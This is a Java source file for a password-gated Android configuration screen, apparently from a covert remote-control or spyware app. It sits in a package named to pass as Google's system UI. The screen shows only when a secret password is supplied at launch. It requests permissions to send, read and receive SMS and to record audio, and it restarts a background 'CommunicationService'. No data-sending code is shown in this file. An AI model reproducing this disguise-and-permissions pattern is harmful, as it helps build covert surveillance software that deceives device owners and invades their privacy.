package com.google.android.systemUi.activity;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceFragment;
import android.preference.PreferenceManager;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.google.android.systemUi.R;
import com.google.android.systemUi.service.CommunicationService;

import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.RECEIVE_SMS;
import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.SEND_SMS;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

/**
 * Created by: veli
 * Date: 1/26/17 9:48 PM
 */

public class Configuration extends Activity
{
	public static final String EXTRA_PASSWORD = "extraPassword";

	private static final int REQUEST_PERMISSIONS = 0;

	private SharedPreferences mPreferences;
	private PreferencesFragment mFragment;

	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);

		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);

		if (getIntent() == null ||
				!getIntent().hasExtra(EXTRA_PASSWORD) ||
				!mPreferences.getString("password", "password").equals(getIntent().getStringExtra(EXTRA_PASSWORD)))
		{
			Toast.makeText(this, "Missing arguments. Exited!", Toast.LENGTH_SHORT).show();
			finish();
		}

		if (mFragment == null)
			mFragment = new PreferencesFragment();

		getFragmentManager()
				.beginTransaction()
				.replace(android.R.id.content, mFragment)
				.commit();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu)
	{
		getMenuInflater().inflate(R.menu.configuration, menu);

		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
			menu.findItem(R.id.requestPermissions).setVisible(false);

		return super.onCreateOptionsMenu(menu);
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item)
	{
		int id = item.getItemId();

		if (id == R.id.requestPermissions)
		{
			handlePermissions();
			return true;
		}
		else if (id == R.id.restartService)
		{
			stopService(new Intent(this, CommunicationService.class));
			startService(new Intent(this, CommunicationService.class));

			Toast.makeText(this, "Restarting communication service", Toast.LENGTH_SHORT).show();
			return true;
		}

		return super.onOptionsItemSelected(item);
	}

	public void handlePermissions()
	{
		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
		{

		}
		else
		{
			requestPermissions(new String[]{SEND_SMS, READ_SMS, RECORD_AUDIO, RECEIVE_SMS, WRITE_EXTERNAL_STORAGE}, REQUEST_PERMISSIONS);
		}
	}

	public static class PreferencesFragment extends PreferenceFragment
	{
		@Override
		public void onCreate(Bundle savedInstanceState)
		{
			super.onCreate(savedInstanceState);
			addPreferencesFromResource(R.xml.preferences);
		}
	}
}
